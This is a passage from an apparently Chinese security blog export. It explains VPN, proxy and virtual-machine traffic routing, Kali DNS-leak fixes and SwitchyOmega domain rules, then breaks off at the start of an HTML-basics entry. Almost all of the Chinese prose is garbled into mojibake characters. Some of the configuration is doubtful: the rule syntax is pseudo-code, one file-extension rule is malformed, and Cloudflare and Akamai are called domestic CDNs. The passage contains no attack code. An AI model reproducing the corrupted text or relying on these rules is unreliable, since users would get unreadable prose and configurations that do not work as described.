<h2 id="äºŒã€å››å¤§æ ¸å¿ƒåœºæ™¯æµé‡èµ°å‘è¯¦è§£"><a href="#äºŒã€å››å¤§æ ¸å¿ƒåœºæ™¯æµé‡èµ°å‘è¯¦è§£" class="headerlink" title="äºŒã€å››å¤§æ ¸å¿ƒåœºæ™¯æµé‡èµ°å‘è¯¦è§£"></a>äºŒã€å››å¤§æ ¸å¿ƒåœºæ™¯æµé‡èµ°å‘è¯¦è§£</h2><h3 id="åœºæ™¯1ï¼šä¸»æœºæ ‡å‡†VPNæ¨¡å¼ï¼ˆæ— å†²çªï¼‰"><a href="#åœºæ™¯1ï¼šä¸»æœºæ ‡å‡†VPNæ¨¡å¼ï¼ˆæ— å†²çªï¼‰" class="headerlink" title="åœºæ™¯1ï¼šä¸»æœºæ ‡å‡†VPNæ¨¡å¼ï¼ˆæ— å†²çªï¼‰"></a>åœºæ™¯1ï¼šä¸»æœºæ ‡å‡†VPNæ¨¡å¼ï¼ˆæ— å†²çªï¼‰</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_2.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">



<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼šæœ€æ ‡å‡†çš„VPNä½¿ç”¨åœºæ™¯ã€‚æ‰€æœ‰åº”ç”¨ç¨‹åºæµé‡éƒ½éµå¾ªç³»ç»Ÿçº§ä»£ç†è®¾ç½®ï¼Œé€šè¿‡VPNéš§é“åŠ å¯†è½¬å‘ï¼Œå®ç°å…¨å±€ç½‘ç»œåŒ¿ååŒ–ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šéœ€è¦å®Œå…¨åŒ¿åã€å®‰å…¨åŠ å¯†æ‰€æœ‰æµé‡çš„ç¯å¢ƒã€‚</p>
<h3 id="åœºæ™¯2ï¼šä¸»æœºæµè§ˆå™¨ä»£ç†åˆ†æµï¼ˆä¸»åŠ¨ç»•è¡Œï¼‰"><a href="#åœºæ™¯2ï¼šä¸»æœºæµè§ˆå™¨ä»£ç†åˆ†æµï¼ˆä¸»åŠ¨ç»•è¡Œï¼‰" class="headerlink" title="åœºæ™¯2ï¼šä¸»æœºæµè§ˆå™¨ä»£ç†åˆ†æµï¼ˆä¸»åŠ¨ç»•è¡Œï¼‰"></a>åœºæ™¯2ï¼šä¸»æœºæµè§ˆå™¨ä»£ç†åˆ†æµï¼ˆä¸»åŠ¨ç»•è¡Œï¼‰</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_3.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼šæµè§ˆå™¨æ’ä»¶ä¼˜å…ˆçº§é«˜äºç³»ç»Ÿä»£ç†ï¼Œå®ç°<strong>ç²¾ç»†åŒ–æµé‡åˆ†æµ</strong>ã€‚æµè§ˆå™¨æŒ‰æ’ä»¶è§„åˆ™è½¬å‘ï¼ˆå›½å†…å¤–ç½‘ç«™åˆ†æµï¼‰ï¼Œå…¶ä»–åº”ç”¨ä»èµ°VPNé€šé“ã€‚</p>
<p><strong>å­˜åœ¨æ„ä¹‰</strong>ï¼šè§£å†³VPNâ€ä¸€åˆ€åˆ‡â€çš„å¼Šç«¯ï¼Œä¼˜åŒ–è®¿é—®é€Ÿåº¦ï¼Œé¿å…å›½å†…æµé‡ç»•è¡Œã€‚</p>
<h3 id="åœºæ™¯3ï¼šè™šæ‹Ÿæœºç†æƒ³å…±äº«æ¨¡å¼ï¼ˆé€æ˜ä»£ç†ï¼‰"><a href="#åœºæ™¯3ï¼šè™šæ‹Ÿæœºç†æƒ³å…±äº«æ¨¡å¼ï¼ˆé€æ˜ä»£ç†ï¼‰" class="headerlink" title="åœºæ™¯3ï¼šè™šæ‹Ÿæœºç†æƒ³å…±äº«æ¨¡å¼ï¼ˆé€æ˜ä»£ç†ï¼‰"></a>åœºæ™¯3ï¼šè™šæ‹Ÿæœºç†æƒ³å…±äº«æ¨¡å¼ï¼ˆé€æ˜ä»£ç†ï¼‰</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_4.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼šè™šæ‹Ÿæœºé€šè¿‡NATæ¨¡å¼å®Œå…¨ä¾èµ–ä¸»æœºç½‘ç»œè·¯ç”±ï¼Œç»§æ‰¿ä¸»æœºVPNè®¾ç½®ï¼Œå®ç°â€é€æ˜ä»£ç†â€æ•ˆæœã€‚</p>
<p><strong>å‰ææ¡ä»¶</strong>ï¼š</p>
<ul>
<li>è™šæ‹Ÿæœºè®¾ä¸º<strong>NATæ¨¡å¼</strong></li>
<li>å…³é—­è™šæ‹Ÿæœºå†…æ‰€æœ‰ä»£ç†æ’ä»¶</li>
<li>ä¸»æœºè¿è¡Œå…¨å±€VPN</li>
</ul>
<h3 id="åœºæ™¯4ï¼šè™šæ‹Ÿæœºä»£ç†å†²çªï¼ˆåµŒå¥—ç»•è¡Œï¼‰"><a href="#åœºæ™¯4ï¼šè™šæ‹Ÿæœºä»£ç†å†²çªï¼ˆåµŒå¥—ç»•è¡Œï¼‰" class="headerlink" title="åœºæ™¯4ï¼šè™šæ‹Ÿæœºä»£ç†å†²çªï¼ˆåµŒå¥—ç»•è¡Œï¼‰"></a>åœºæ™¯4ï¼šè™šæ‹Ÿæœºä»£ç†å†²çªï¼ˆåµŒå¥—ç»•è¡Œï¼‰</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_5.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼šè™šæ‹Ÿæœºå†…æµè§ˆå™¨æ’ä»¶æ‹¦æˆªæµé‡ï¼Œå¯¼è‡´æµè§ˆå™¨ç»•å¼€ä¸»æœºVPNï¼Œå½¢æˆ<strong>ä»£ç†åµŒå¥—å†²çª</strong>ã€‚</p>
<p><strong>é—®é¢˜æ ¹æº</strong>ï¼šè™šæ‹Ÿæœºå†…çš„é«˜ä¼˜å…ˆçº§ä»£ç†è§„åˆ™è¦†ç›–äº†ä¸»æœºçš„ä½ä¼˜å…ˆçº§ä»£ç†è§„åˆ™ã€‚</p>
<hr>
<h2 id="ä¸‰ã€Kali-è™šæ‹Ÿæœºé…ç½®"><a href="#ä¸‰ã€Kali-è™šæ‹Ÿæœºé…ç½®" class="headerlink" title="ä¸‰ã€Kali è™šæ‹Ÿæœºé…ç½®"></a>ä¸‰ã€Kali è™šæ‹Ÿæœºé…ç½®</h2><h3 id="å®Œæ•´é…ç½®æ£€æŸ¥æ¸…å•"><a href="#å®Œæ•´é…ç½®æ£€æŸ¥æ¸…å•" class="headerlink" title="å®Œæ•´é…ç½®æ£€æŸ¥æ¸…å•"></a>å®Œæ•´é…ç½®æ£€æŸ¥æ¸…å•</h3><p>ä¸ºç¡®ä¿Kaliè™šæ‹Ÿæœºæ­£ç¡®å…±äº«ä¸»æœºVPNï¼Œè¯·æŒ‰ä»¥ä¸‹æµç¨‹ç³»ç»Ÿé…ç½®ï¼š</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_6.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<h3 id="å…³é”®é…ç½®æ­¥éª¤"><a href="#å…³é”®é…ç½®æ­¥éª¤" class="headerlink" title="å…³é”®é…ç½®æ­¥éª¤"></a>å…³é”®é…ç½®æ­¥éª¤</h3><h4 id="1-åŸºç¡€ç¯å¢ƒé…ç½®"><a href="#1-åŸºç¡€ç¯å¢ƒé…ç½®" class="headerlink" title="1. åŸºç¡€ç¯å¢ƒé…ç½®"></a>1. åŸºç¡€ç¯å¢ƒé…ç½®</h4><ul>
<li><strong>ä¸»æœºVPN</strong>ï¼šå¿…é¡»ä½¿ç”¨ç³»ç»Ÿçº§å…¨å±€VPNï¼ˆOpenVPNã€WireGuardç­‰ï¼‰</li>
<li><strong>ç½‘ç»œæ¨¡å¼</strong>ï¼šè™šæ‹Ÿæœºè®¾ç½®ä¸º<strong>NATæ¨¡å¼</strong>ï¼ˆé»˜è®¤ï¼‰</li>
</ul>
<h4 id="2-DNSæ³„æ¼è§£å†³æ–¹æ¡ˆ"><a href="#2-DNSæ³„æ¼è§£å†³æ–¹æ¡ˆ" class="headerlink" title="2. DNSæ³„æ¼è§£å†³æ–¹æ¡ˆ"></a>2. DNSæ³„æ¼è§£å†³æ–¹æ¡ˆ</h4><p><strong>ä¸´æ—¶æ–¹æ¡ˆï¼ˆæµ‹è¯•ç”¨ï¼‰</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf</span><br><span class="line"><span class="comment"># æ·»åŠ ï¼šnameserver 10.8.0.1 ï¼ˆæ›¿æ¢ä¸ºå®é™…VPN DNSï¼‰</span></span><br><span class="line"><span class="built_in">sudo</span> chattr +i /etc/resolv.conf  <span class="comment"># é”å®šæ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p><strong>æ°¸ä¹…æ–¹æ¡ˆï¼ˆæ¨èï¼‰</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /etc/resolv.conf</span><br><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf  <span class="comment"># é…ç½®VPN DNS</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="å››ã€éªŒè¯ä¸æ•…éšœæ’é™¤"><a href="#å››ã€éªŒè¯ä¸æ•…éšœæ’é™¤" class="headerlink" title="å››ã€éªŒè¯ä¸æ•…éšœæ’é™¤"></a>å››ã€éªŒè¯ä¸æ•…éšœæ’é™¤</h2><h3 id="åŸºç¡€éªŒè¯æ–¹æ³•"><a href="#åŸºç¡€éªŒè¯æ–¹æ³•" class="headerlink" title="åŸºç¡€éªŒè¯æ–¹æ³•"></a>åŸºç¡€éªŒè¯æ–¹æ³•</h3><ol>
<li><p><strong>IPåœ°å€æ£€æµ‹</strong>ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line"><span class="comment"># è®¿é—®ï¼šWhatIsMyIPAddress.com</span></span><br></pre></td></tr></table></figure>
<p><strong>é¢„æœŸ</strong>ï¼šæ˜¾ç¤ºIPåº”ä¸VPNæœåŠ¡å™¨ä½ç½®ä¸€è‡´</p>
</li>
<li><p><strong>DNSæ³„æ¼æµ‹è¯•</strong>ï¼š</p>
<ul>
<li>è®¿é—® <a href="https://www.dnsleaktest.com/">DNS Leak Test</a></li>
<li>æ‰§è¡Œ <strong>Extended Test</strong><br><strong>é¢„æœŸ</strong>ï¼šä¸åº”å‡ºç°æœ¬åœ°ISPçš„DNSæœåŠ¡å™¨</li>
</ul>
</li>
</ol>
<h3 id="æ•…éšœæ’é™¤-checklist"><a href="#æ•…éšœæ’é™¤-checklist" class="headerlink" title="æ•…éšœæ’é™¤ checklist"></a>æ•…éšœæ’é™¤ checklist</h3><ul>
<li>âœ… ä¸»æœºVPNæ˜¯å¦æ­£å¸¸è¿æ¥</li>
<li>âœ… è™šæ‹Ÿæœºæ˜¯å¦ä¸ºNATæ¨¡å¼  </li>
<li>âœ… è™šæ‹Ÿæœºæµè§ˆå™¨ä»£ç†æ’ä»¶æ˜¯å¦å…³é—­</li>
<li>âœ… DNSæ˜¯å¦é…ç½®æ­£ç¡®ä¸”æ— æ³„æ¼</li>
<li>âœ… ç³»ç»Ÿæ—¶é—´æ˜¯å¦åŒæ­¥ï¼ˆå½±å“HTTPSï¼‰</li>
</ul>
<h2 id="äº”ã€çŸ¥è¯†æ€»ç»“"><a href="#äº”ã€çŸ¥è¯†æ€»ç»“" class="headerlink" title="äº”ã€çŸ¥è¯†æ€»ç»“"></a>äº”ã€çŸ¥è¯†æ€»ç»“</h2><h3 id="ä»£ç†é€‰æ‹©ç­–ç•¥"><a href="#ä»£ç†é€‰æ‹©ç­–ç•¥" class="headerlink" title="ä»£ç†é€‰æ‹©ç­–ç•¥"></a>ä»£ç†é€‰æ‹©ç­–ç•¥</h3><table>
<thead>
<tr>
<th>éœ€æ±‚åœºæ™¯</th>
<th>æ¨èä»£ç†æ–¹å¼</th>
<th>ç†ç”±</th>
</tr>
</thead>
<tbody><tr>
<td>å…¨å±€åŒ¿åå®‰å…¨</td>
<td><strong>ç½‘ç»œå±‚VPN</strong></td>
<td>æ‰€æœ‰æµé‡åŠ å¯†ï¼Œå®Œå…¨åŒ¿å</td>
</tr>
<tr>
<td>ç½‘é¡µæµè§ˆä¼˜åŒ–</td>
<td><strong>æµè§ˆå™¨æ’ä»¶</strong></td>
<td>å›½å†…å¤–åˆ†æµï¼Œé€Ÿåº¦æœ€ä¼˜</td>
</tr>
<tr>
<td>åŠå…¬ç¯å¢ƒç»Ÿä¸€</td>
<td><strong>ç³»ç»Ÿä»£ç†</strong></td>
<td>ç»Ÿä¸€ç®¡ç†ï¼Œé…ç½®ç®€ä¾¿</td>
</tr>
<tr>
<td>è™šæ‹Ÿæœºå…±äº«</td>
<td><strong>NATæ¨¡å¼+VPN</strong></td>
<td>é€æ˜ä»£ç†ï¼Œæ— éœ€å¤æ‚é…ç½®</td>
</tr>
</tbody></table>
<h3 id="å…³é”®åŸåˆ™"><a href="#å…³é”®åŸåˆ™" class="headerlink" title="å…³é”®åŸåˆ™"></a>å…³é”®åŸåˆ™</h3><ol>
<li><strong>ç†è§£ä»£ç†å±‚çº§</strong>ï¼šæµè§ˆå™¨æ’ä»¶ &gt; ç³»ç»Ÿä»£ç† &gt; VPN</li>
<li><strong>è™šæ‹Ÿæœºå‰æ</strong>ï¼šNATæ¨¡å¼æ˜¯å…±äº«ä¸»æœºVPNçš„åŸºç¡€</li>
<li><strong>DNSå®‰å…¨</strong>ï¼šDNSæ³„æ¼æ˜¯æœ€å¤§çš„å®‰å…¨éšæ‚£</li>
<li><strong>æŒ‰éœ€é…ç½®</strong>ï¼šæ ¹æ®å®é™…éœ€æ±‚é€‰æ‹©åˆé€‚çš„ä»£ç†å±‚çº§</li>
</ol>
<hr>
<h2 id="å…­ã€æµè§ˆå™¨æ’ä»¶ä½¿ç”¨"><a href="#å…­ã€æµè§ˆå™¨æ’ä»¶ä½¿ç”¨" class="headerlink" title="å…­ã€æµè§ˆå™¨æ’ä»¶ä½¿ç”¨"></a>å…­ã€æµè§ˆå™¨æ’ä»¶ä½¿ç”¨</h2><h3 id="æ–¹æ³•ä¸€ï¼šSwitchyOmega-ç³»ç»ŸVPNè”åŠ¨ï¼ˆæ¨èï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šSwitchyOmega-ç³»ç»ŸVPNè”åŠ¨ï¼ˆæ¨èï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šSwitchyOmega + ç³»ç»ŸVPNè”åŠ¨ï¼ˆæ¨èï¼‰"></a>æ–¹æ³•ä¸€ï¼šSwitchyOmega + ç³»ç»ŸVPNè”åŠ¨ï¼ˆæ¨èï¼‰</h3><ul>
<li><p>åŸºç¡€ç¯å¢ƒå‡†å¤‡</p>
<ul>
<li><strong>ç³»ç»ŸVPN</strong>ï¼šè¿æ¥ä½ çš„å…¨å±€VPNï¼ˆOpenVPNã€WireGuardç­‰ï¼‰</li>
<li><strong>SwitchyOmega</strong>ï¼šåœ¨æµè§ˆå™¨ä¸­å®‰è£…å¹¶é…ç½®</li>
</ul>
</li>
<li><p>SwitchyOmegaé…ç½®æ­¥éª¤ï¼š åˆ›å»ºä¸¤ä¸ªæƒ…æ™¯æ¨¡å¼ï¼š</p>
<ul>
<li><p><strong>ç›´è¿æ¨¡å¼</strong>ï¼ˆDirectï¼‰<br>- ç±»å‹ï¼šç›´æ¥è¿æ¥<br>- ç”¨äºè®¿é—®å›½å†…ç½‘ç«™</p>
</li>
<li><p><strong>VPNæ¨¡å¼</strong>ï¼ˆSystem VPNï¼‰<br>- ç±»å‹ï¼šç›´æ¥è¿æ¥ï¼ˆæ˜¯çš„ï¼Œç›´æ¥è¿æ¥ï¼ï¼‰<br>- å› ä¸ºç³»ç»ŸVPNå·²ç»åœ¨å…¨å±€å·¥ä½œï¼Œè¿™é‡Œé€‰æ‹©ç›´æ¥è¿æ¥å°±ä¼šèµ°ç³»ç»ŸVPN</p>
</li>
</ul>
</li>
</ul>
<p><strong>é…ç½®è‡ªåŠ¨åˆ‡æ¢æ¨¡å¼ï¼ˆAuto Switchï¼‰ï¼š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åœ¨è‡ªåŠ¨åˆ‡æ¢çš„è§„åˆ™åˆ—è¡¨ä¸­é…ç½®</span></span><br><span class="line"><span class="comment">// å›½å†…ç½‘ç«™ç›´è¿ï¼Œå›½å¤–ç½‘ç«™èµ°ç³»ç»ŸVPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›´è¿è§„åˆ™ï¼ˆå›½å†…ç½‘ç«™ï¼‰</span></span><br><span class="line">||baidu.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span>  </span><br><span class="line">||qq.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||weibo.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||zhihu.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||alipay.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||jd.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||<span class="number">163.</span>com^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||sina.<span class="property">com</span>.<span class="property">cn</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||sohu.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ç³»ç»ŸVPNï¼ˆå›½å¤–ç½‘ç«™ï¼‰</span></span><br><span class="line">||google.<span class="property">com</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||facebook.<span class="property">com</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||twitter.<span class="property">com</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||github.<span class="property">com</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||wikipedia.<span class="property">org</span>^ â†’ <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤è§„åˆ™ï¼šç›´è¿ï¼ˆä¿å®ˆç­–ç•¥ï¼‰</span></span><br><span class="line">* â†’ <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ›´æ™ºèƒ½çš„æ–¹æ¡ˆï¼šä½¿ç”¨è§„åˆ™åˆ—è¡¨</p>
<p><strong>å¯¼å…¥ç°æˆçš„è§„åˆ™åˆ—è¡¨ï¼š</strong></p>
<ol>
<li>åœ¨Auto Switchæ¨¡å¼ä¸­ç‚¹å‡»â€ä»æ–‡ä»¶æ¢å¤â€</li>
<li>å¯¼å…¥ä»¥ä¸‹è§„åˆ™åˆ—è¡¨ä¹‹ä¸€ï¼š<ul>
<li><strong>GFWList</strong>ï¼šæœ€å…¨é¢çš„è¢«å¢™ç½‘ç«™åˆ—è¡¨</li>
<li><strong>ChinaList</strong>ï¼šä¸­å›½å›½å†…ç½‘ç«™åˆ—è¡¨</li>
</ul>
</li>
</ol>
<p><strong>æˆ–è€…ä½¿ç”¨åœ¨çº¿è§„åˆ™åˆ—è¡¨ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</span><br></pre></td></tr></table></figure>

<p>é…ç½®å®Œæˆåï¼Œæµé‡èµ°å‘å¦‚ä¸‹ï¼š</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_7.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<h3 id="æ–¹æ³•äºŒï¼šçº¯SwitchyOmegaä»£ç†æ–¹æ¡ˆï¼ˆæ›¿ä»£æ–¹æ¡ˆï¼‰"><a href="#æ–¹æ³•äºŒï¼šçº¯SwitchyOmegaä»£ç†æ–¹æ¡ˆï¼ˆæ›¿ä»£æ–¹æ¡ˆï¼‰" class="headerlink" title="æ–¹æ³•äºŒï¼šçº¯SwitchyOmegaä»£ç†æ–¹æ¡ˆï¼ˆæ›¿ä»£æ–¹æ¡ˆï¼‰"></a>æ–¹æ³•äºŒï¼šçº¯SwitchyOmegaä»£ç†æ–¹æ¡ˆï¼ˆæ›¿ä»£æ–¹æ¡ˆï¼‰</h3><p>å¦‚æœç³»ç»ŸVPNä¸ç¨³å®šï¼Œå¯ä»¥åœ¨SwitchyOmegaä¸­ç›´æ¥é…ç½®ä»£ç†ï¼š</p>
<p>é…ç½®ä»£ç†æœåŠ¡å™¨æƒ…æ™¯æ¨¡å¼ï¼š</p>
<ul>
<li><strong>åç§°</strong>ï¼šMy VPN</li>
<li><strong>åè®®</strong>ï¼šSOCKS5 æˆ– HTTP</li>
<li><strong>æœåŠ¡å™¨</strong>ï¼šä½ çš„VPNæœåŠ¡å™¨åœ°å€</li>
<li><strong>ç«¯å£</strong>ï¼šå¯¹åº”çš„ä»£ç†ç«¯å£</li>
</ul>
<p> è‡ªåŠ¨åˆ‡æ¢è§„åˆ™</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å›½å†…CDNå’Œå¸¸ç”¨æœåŠ¡ç›´è¿</span></span><br><span class="line">||cn^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||baidu.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å›½å¤–ç½‘ç«™èµ°ä»£ç†</span></span><br><span class="line">||google.<span class="property">com</span>^ â†’ <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ â†’ <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤ç›´è¿</span></span><br><span class="line">* â†’ <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•ä¸‰ï¼šè¿›é˜¶ä¼˜åŒ–é…ç½®"><a href="#æ–¹æ³•ä¸‰ï¼šè¿›é˜¶ä¼˜åŒ–é…ç½®" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šè¿›é˜¶ä¼˜åŒ–é…ç½®"></a>æ–¹æ³•ä¸‰ï¼šè¿›é˜¶ä¼˜åŒ–é…ç½®</h3><ol>
<li>æ€§èƒ½ä¼˜åŒ–è§„åˆ™</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å›¾ç‰‡ã€è§†é¢‘ç›´è¿ï¼ˆåŠ é€ŸåŠ è½½ï¼‰</span></span><br><span class="line">||jpg|png|gif|mp4|webm^ â†’ <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å›½å†…CDNç›´è¿</span></span><br><span class="line">||cloudflare.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||akamai.<span class="property">net</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é“¶è¡Œæ”¯ä»˜ç½‘ç«™ç›´è¿ï¼ˆå®‰å…¨ï¼‰</span></span><br><span class="line">||alipay.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||unionpay.<span class="property">com</span>^ â†’ <span class="title class_">Direct</span></span><br><span class="line">||icbc.<span class="property">com</span>.<span class="property">cn</span>^ â†’ <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>æ¡ä»¶è§„åˆ™</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ ¹æ®ç½‘ç»œç¯å¢ƒè‡ªåŠ¨è°ƒæ•´</span></span><br><span class="line"><span class="comment">// å¦‚æœåœ¨å›½å†…ç½‘ç»œï¼Œå¯ç”¨åˆ†æµ</span></span><br><span class="line"><span class="comment">// å¦‚æœåœ¨å›½å¤–ç½‘ç»œï¼Œå…¨éƒ¨ç›´è¿</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ¬åœ°ç½‘ç»œç›´è¿</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> â†’ <span class="title class_">Direct</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span> â†’ <span class="title class_">Direct</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> â†’ <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h2 id="éªŒè¯é…ç½®æ•ˆæœ"><a href="#éªŒè¯é…ç½®æ•ˆæœ" class="headerlink" title="éªŒè¯é…ç½®æ•ˆæœ"></a>éªŒè¯é…ç½®æ•ˆæœ</h2><ol>
<li>æµ‹è¯•å›½å†…ç½‘ç«™</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¿é—®ä»¥ä¸‹ç½‘ç«™åº”æ˜¾ç¤ºå›½å†…IP</span></span><br><span class="line">ç™¾åº¦ã€æ·˜å®ã€äº¬ä¸œ</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>æµ‹è¯•å›½å¤–ç½‘ç«™</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è®¿é—®ä»¥ä¸‹ç½‘ç«™åº”æ˜¾ç¤ºVPNæœåŠ¡å™¨IP</span></span><br><span class="line">Googleã€YouTubeã€Twitter</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>ä½¿ç”¨æ£€æµ‹ç½‘ç«™</li>
</ol>
<ul>
<li><strong>IPæ£€æµ‹</strong>ï¼šwhatismyipaddress.com</li>
<li><strong>DNSæ£€æµ‹</strong>ï¼šdnsleaktest.com</li>
</ul>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>åŸºç¡€çŸ¥è¯†</category>
      </categories>
      <tags>
        <tag>VPN</tag>
        <tag>ä»£ç†</tag>
        <tag>è™šæ‹Ÿæœºç½‘ç»œ</tag>
      </tags>
  </entry>
  <entry>
    <title>WEBå®‰å…¨ HTMLåŸºç¡€</title>
    <url>/2025/12/05/WEB%E5%AE%89%E5%85%A8HTML%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="1-ç®€å•çš„HTMLé¡µé¢æ¶æ„"><a href="#1-ç®€å•çš„HTMLé¡µé¢æ¶æ„" class="headerlink" title="1. ç®€å•çš„HTMLé¡µé¢æ¶æ„"></a>1. ç®€å•çš„HTMLé¡µé¢æ¶æ„</h2><p>HTML5æ ‡å‡†æ–‡æ¡£ç»“æ„æ˜¯ç½‘é¡µçš„åŸºç¡€æ¡†æ¶ï¼ŒåŒ…å«æ–‡æ¡£ç±»å‹å£°æ˜ã€æ ¹å…ƒç´ ã€å¤´éƒ¨å’Œä¸»ä½“éƒ¨åˆ†ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WEBå®‰å…¨å­¦ä¹ å¹³å°<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 